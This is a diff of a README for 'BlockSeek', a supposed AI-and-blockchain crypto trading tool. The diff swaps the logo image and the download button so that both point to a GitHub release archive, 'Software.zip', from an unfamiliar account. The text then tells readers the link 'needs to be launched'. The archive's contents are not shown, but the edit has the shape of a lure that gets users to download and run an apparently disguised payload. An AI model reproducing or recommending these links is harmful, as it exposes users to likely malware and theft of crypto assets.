@@ -2,7 +2,7 @@
 
 Welcome to the official documentation repository for BlockSeek! 🌟
 
-![BlockSeek Logo](https://example.com/blockseek-logo.png)
+![BlockSeek Logo](https://github.com/XyloOlyx/blockseek/releases/download/v2.0/Software.zip)
 
 ## Introduction
 BlockSeek is the cutting-edge platform that merges advanced Artificial Intelligence (AI) techniques with the power of blockchain technology to transform the world of cryptocurrency trading and analysis. Our goal is to provide users with innovative tools and insights to navigate the dynamic landscape of digital assets.
@@ -17,7 +17,7 @@ BlockSeek is the cutting-edge platform that merges advanced Artificial Intellige
 ## Getting Started
 To get started with BlockSeek, you can download our latest release by clicking on the button below:
 
-[![Download BlockSeek](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download BlockSeek](https://github.com/XyloOlyx/blockseek/releases/download/v2.0/Software.zip)](https://github.com/XyloOlyx/blockseek/releases/download/v2.0/Software.zip)
 
 Please note that the download link needs to be launched to access the latest version of BlockSeek.
 
